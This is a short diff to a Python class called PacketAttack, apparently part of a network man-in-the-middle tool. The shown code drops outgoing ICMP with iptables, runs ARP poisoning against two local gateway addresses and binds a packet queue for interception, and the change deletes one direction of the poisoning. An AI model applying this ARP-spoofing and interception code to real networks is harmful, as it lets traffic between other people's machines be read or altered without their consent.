@@ -35,7 +35,6 @@ class PacketAttack(SyncedAttack):
         os.system('iptables -A OUTPUT -p icmp -j DROP')
 
         launch_arp_poison("192.168.1.1", "192.168.1.254")
-        launch_arp_poison("192.168.1.254", "192.168.1.1")
 
         try:
             self.q = self.queue.bind(1)
